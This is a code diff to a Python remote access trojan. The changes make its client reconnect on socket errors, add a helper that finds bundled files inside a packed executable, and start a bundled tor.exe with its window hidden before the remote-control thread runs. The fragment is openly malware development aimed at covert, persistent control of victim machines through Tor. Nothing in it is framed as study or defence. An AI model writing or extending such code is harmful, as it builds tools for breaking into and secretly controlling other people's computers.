@@ -240,26 +240,24 @@ def rat_client():
 	except socket.error as e:
 		print(f"Socket error: {e}. Reconnecting...")
 		s.close()
+		rat_client()
 	except Exception as e:
 		print(f"An error occurred: {e}")
-		
 		s.send(str.encode(f"Error: {str(e)}"))
-	finally:
-		s.close()
-		rat_client()
 
 
+def resource_path(relative_path):
+    import sys, os
+    if hasattr(sys, "_MEIPASS"):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
 
-
-# Main
-def start_tor():
-	execute_commands("cd trojan/tor/tor")
-	execute_commands("tor.exe")
-	time.sleep(10)
 def main():
 	
 	tor_process = subprocess.Popen(
-    "trojan/tor/tor/tor.exe",
+    resource_path("tor/tor/tor.exe"),
     stdout=subprocess.DEVNULL,
     stderr=subprocess.DEVNULL,
     creationflags=subprocess.CREATE_NO_WINDOW
@@ -267,7 +265,7 @@ def main():
 	ratThread = threading.Thread(target=rat_client, daemon=True)
 	ratThread.start()
 	ratThread.join()
-	tor_process.terminate()
+	tor_process.kill()
 
 
 if __name__ == "__main__":
